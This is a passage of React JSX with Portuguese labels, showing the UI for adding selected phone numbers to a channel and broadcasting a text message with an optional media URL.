                                        background:'linear-gradient(135deg, #238636 0%, #1a7e37 100%)',
                                        color:'white',
                                        border:'none',
                                        borderRadius:'6px',
                                        cursor:addingMembers || selectedChannelPhones.size === 0 ? 'not-allowed' : 'pointer',
                                        fontSize:'13px',
                                        fontWeight:'bold'
                                    }}
                                >
                                    {addingMembers ? '⏳ Adicionando...' : '👥 Adicionar Membros'}
                                </button>
                            </div>

                            {/* DISPARO PARA CANAL */}
                            <div>
                                <h5 style={{color:'white', marginTop:0, marginBottom:'10px'}}>📺 Enviar Mensagem</h5>
                                
                                <div style={{marginBottom:'10px'}}>
                                    <label style={{color:'#8b949e', fontSize:'12px', display:'block', marginBottom:'5px'}}>Mensagem</label>
                                    <textarea 
                                        value={channelMessage}
                                        onChange={(e) => setChannelMessage(e.target.value)}
                                        placeholder="Digite a mensagem para enviar ao canal..."
                                        style={{width:'100%', padding:'8px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'13px', minHeight:'80px', resize:'vertical', marginBottom:'8px'}}
                                    />
                                    
                                    <input 
                                        type="url" 
                                        value={channelMediaUrl}
                                        onChange={(e) => setChannelMediaUrl(e.target.value)}
                                        placeholder="URL da mídia (opcional)"
                                        style={{width:'100%', padding:'8px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'13px', marginBottom:'8px'}}
                                    />
                                </div>
                                
                                <button 
                                    onClick={broadcastToChannel}
                                    disabled={broadcastingChannel || !channelMessage.trim()}
                                    style={{
                                        width:'100%',
                                        padding:'10px',
                                        background:'linear-gradient(135deg, #f59e0b 0%, #d97706 100%)',
                                        color:'white',
                                        border:'none',
                                        borderRadius:'6px',
                                        cursor:broadcastingChannel || !channelMessage.trim() ? 'not-allowed' : 'pointer',
                                        fontSize:'13px',
                                        fontWeight:'bold'
                                    }}
                                >
                                    {broadcastingChannel ? '⏳ Enviando...' : '📺 Enviar Mensagem'}
                                </button>
                            </div>
                        </div>
                    </div>
                )}
            </div>
        )}
    </div>
  );
}
